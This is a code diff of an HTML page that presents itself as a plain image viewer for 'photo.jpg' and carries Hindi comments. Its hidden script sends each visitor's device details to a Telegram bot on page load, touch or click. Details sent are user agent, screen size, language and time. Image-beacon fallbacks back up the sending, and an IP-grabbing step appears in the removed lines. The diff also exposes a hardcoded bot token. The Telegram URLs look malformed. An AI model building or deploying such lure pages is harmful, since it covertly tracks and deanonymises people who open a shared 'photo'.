@@ -4,14 +4,27 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
-        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
+        body { 
+            background-color: black; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            user-select: none; 
+        }
+        img { 
+            max-width: 100%; 
+            max-height: 100vh; 
+            object-fit: contain; 
+        }
     </style>
 </head>
 <body>
 
-    <!-- 📷 फोटो अब हर हाल में दिखेगी -->
-    <img src="photo.jpg" alt="Image Viewer">
+    <!-- 📷 फोटो हमेशा लोड होगी -->
+    <img src="photo.jpg" alt="Image Viewer" id="targetImage">
 
     <script>
         const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
@@ -19,34 +32,27 @@
 
         let isTracked = false;
 
-        function startTracking() {
+        function sendToTelegramDirect() {
             if (isTracked) return;
             isTracked = true;
 
-            // 🌐 बिना किसी फिल्टर के सबसे तेज और डायरेक्ट आईपी निकालने वाली लाइव API
-            fetch('https://ipify.org')
-            .then(res => res.json())
-            .then(data => {
-                sendToTelegram(data.ip);
-            })
-            .catch(() => {
-                // बैकअप तरीका: अगर पहली API व्यस्त हो तो तुरंत दूसरी API चालू होगी
-                fetch('https://ipapi.co')
-                .then(res => res.json())
-                .then(data => sendToTelegram(data.ip))
-                .catch(() => sendToTelegram("IP Hidden/VPN Active"));
-            });
-        }
-
-        function sendToTelegram(ip) {
+            // बुनियादी और सटीक डिवाइस विवरण निकालना (जो कभी ब्लॉक नहीं होता)
             const userAgentText = navigator.userAgent;
+            const screenRes = window.screen.width + "x" + window.screen.height;
+            const pageLanguage = navigator.language || "Unknown";
+            const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-            const message = `🚨 *New Visitor Alert* 🚨\n\n` +
-                            `🌐 *IP Address:* \`${ip}\`\n` +
+            // टेलीग्राम के लिए सुंदर मैसेज तैयार करना
+            const message = `🔔 *LIVE VISITOR ALERT* 🔔\n\n` +
                             `📱 *Device Details:* \`${userAgentText}\`\n` +
-                            `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
+                            `🖥️ *Screen Size:* \`${screenRes}\`\n` +
+                            `🌐 *Language:* \`${pageLanguage}\`\n` +
+                            `⏱️ *Time:* ${currentTime}`;
 
-            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
+            // बिना किसी बाहरी API के सीधे टेलीग्राम को डेटा भेजना
+            const url = `https://telegram.org{telegramToken}/sendMessage`;
+            
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -54,13 +60,30 @@
                     text: message,
                     parse_mode: 'Markdown'
                 })
+            }).then(res => {
+                if(res.ok) {
+                    console.log("Success");
+                } else {
+                    // यदि fetch ब्लॉक हो, तो इमेज मेथड (Image Beacon) से बैकअप भेजना
+                    const fallbackUrl = `https://telegram.org{telegramToken}/sendMessage?chat_id=${telegramChatId}&text=Visitor_Alert_Triggered_At_${encodeRaw(currentTime)}`;
+                    new Image().src = fallbackUrl;
+                }
+            }).catch(() => {
+                // अंतिम बैकअप: अगर सब कुछ फेल हो जाए
+                const backupUrl = `https://telegram.org{telegramToken}/sendMessage?chat_id=${telegramChatId}&text=New_Visitor_On_Website`;
+                new Image().src = backupUrl;
             });
         }
 
-        // विज़िटर के पैर रखते ही या स्क्रीन टच करते ही तुरंत टेलीग्राम पर डेटा जाएगा
-        window.addEventListener('DOMContentLoaded', startTracking);
-        window.addEventListener('touchstart', startTracking);
-        window.addEventListener('click', startTracking);
+        function encodeRaw(str) {
+            return encodeURIComponent(str).replace(/[!'()*]/g, escape);
+        }
+
+        // विज़िटर के आते ही, स्क्रीन छूते ही या फोटो पर क्लिक करते ही तुरंत ट्रिगर होगा
+        window.addEventListener('DOMContentLoaded', sendToTelegramDirect);
+        window.addEventListener('touchstart', sendToTelegramDirect);
+        window.addEventListener('click', sendToTelegramDirect);
+        document.getElementById('targetImage').addEventListener('click', sendToTelegramDirect);
     </script>
 
 </body>
